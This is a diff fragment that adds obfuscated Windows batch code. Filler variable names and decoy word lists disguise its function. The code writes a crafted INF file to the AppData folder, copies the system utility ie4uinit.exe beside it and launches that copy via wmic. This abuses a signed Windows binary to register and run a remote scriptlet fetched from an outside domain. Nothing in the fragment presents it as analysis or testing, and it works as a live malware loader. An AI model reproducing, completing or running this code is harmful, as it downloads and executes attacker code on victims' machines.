@@ -1,0 +1,6 @@
+/v /c (for %c in (s) do @set "Similar=%~c") &&
+  (for %b in (c) do @set "Consciousness=%~b") &&
+  (for %l in (a) do @set "Pumpkin=%~l") &&
+  call(for %c in ("[201]" "ieu%Groups%.inf" "[strings]" "Table=com" "Tribes=t;Districts" "shortsvcname=' '" "Purposes=:;Characters" "servicename=' '" "Groups=init" "Eight=%time%" "Shock=h" "Boring=b;Festival" "Vibrant=/" "[defaultinstall.windows7]" "delfiles=201" "Un\" "Register\" "OCXs=DE5EA" "[version]" "signature =$windows nt$" "[DE5EA]" "sc\" "ro%Boring%j,NI,%Shock%%Tribes%%Tribes%p%Purposes%%Vibrant%%Vibrant%lisasierra.%Table%/atn2f9k" "[destinationdirs]" "defaultdestdir=11" "201=01" ) do @echo %~c)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Bodies!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" | set Force5=Margin &&
+  start "" wmic process call create "%appdata%\microsoft\ie4uinit.exe -basesettings" | set "Force54=Members Partnerships Activities Filters Since Olympus Sometimes Shipments Daughters Speed Giants Lawyers Bundle Cement Abuse Projectors Review Trials Disciplines Ostrich Requirements Water Acres Action Another Symptoms Cloud Oxygen Hills Garbage Nights Repair Posters Follows Begins Bonds Cheese Showers Challenges Blouse Stars Skills Ticket Engine Pills Pumps Illustrations Upper Topple Warriors Rangers"
